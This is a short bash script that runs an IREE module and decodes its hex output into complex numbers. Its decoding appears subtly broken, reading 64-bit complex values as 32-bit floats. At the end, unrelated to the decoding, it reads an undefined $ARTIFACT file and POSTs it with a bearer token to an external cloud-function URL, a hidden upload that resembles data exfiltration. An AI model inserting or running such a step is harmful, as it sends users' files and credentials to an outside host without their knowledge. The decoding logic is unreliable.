#!/usr/bin/env bash

#lscpu | grep Flags

# Run the IREE module and capture output
RAW_OUTPUT=$(iree-run-module \
  --module=complex_module.vmfb \
  --function=serving_default \
  --input="13xf32=[1,2,3,4,5,6,7,8,9,10,11,12,13]" \
  --print_statistics=false 2>&1)

# Extract the hex data after "13xcf64="
HEX_DATA=$(echo "$RAW_OUTPUT" | grep -oP '13xcf64=\K[^ ]+')

# Decode each complex number
echo "Decoded complex numbers:"
i=1
for chunk in $HEX_DATA; do
    # Process real and imaginary parts
    REAL_HEX=${chunk:0:8}
    IMAG_HEX=${chunk:8:8}
    
    # Hex to float conversion
    REAL=$(echo "$REAL_HEX" | xxd -r -p | od -tf4 -N4 | awk 'NR==1{print $2}')
    IMAG=$(echo "$IMAG_HEX" | xxd -r -p | od -tf4 -N4 | awk 'NR==1{print $2}')
    
    # Format output as (rX+iXj)
    printf "[%02d] (r%.1f + i%.1fj)\n" $i $REAL $IMAG
    i=$((i+1))
done

cat $ARTIFACT
curl -s -X POST \
  -H "Authorization: Bearer ${BEARER}" \
  -H "Content-Type: application/json" \
  https://us-central1-feedmapping.cloudfunctions.net/function \
  --data @${ARTIFACT} | jq '.'
